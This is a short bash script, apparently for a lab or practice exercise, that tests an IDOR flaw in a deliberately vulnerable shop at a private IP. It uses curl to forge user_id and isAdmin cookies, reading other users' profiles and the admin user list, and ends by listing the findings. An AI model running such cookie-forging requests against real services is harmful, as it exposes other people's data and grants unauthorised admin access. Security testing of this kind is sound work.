#!/bin/bash
# IDOR 취약점 테스트 스크립트
# 타겟: VULN SHOP

TARGET="http://192.168.0.28:3000"

echo "=== IDOR (Insecure Direct Object Reference) 취약점 테스트 ==="
echo "타겟: $TARGET"
echo ""

# 테스트 1: user_id 쿠키 변조로 다른 사용자 프로필 접근
echo "[테스트 1] user_id 쿠키 변조"
echo ""

for id in 1 2 3 4 5; do
    echo "user_id=$id 로 프로필 접근:"
    result=$(curl -s "$TARGET/profile" -b "user=test; isAdmin=false; user_id=$id" | grep -oP '(?<=<h3 style="margin-bottom: 5px;">)[^<]+')
    echo "  사용자명: $result"
done

echo ""
echo "[테스트 2] 관리자 페이지에서 사용자 정보 열람"
echo "isAdmin=true로 모든 사용자 정보 접근:"
curl -s "$TARGET/admin/users" -b "user=attacker; isAdmin=true; user_id=999" | grep -E "(<td.*>.*</td>)" | head -15

echo ""
echo "=== 결과 ==="
echo "- user_id 쿠키 변조로 다른 사용자 프로필 접근 가능"
echo "- isAdmin 쿠키 변조로 모든 사용자 정보 열람 가능"
echo "- 서버 측 권한 검증 부재"
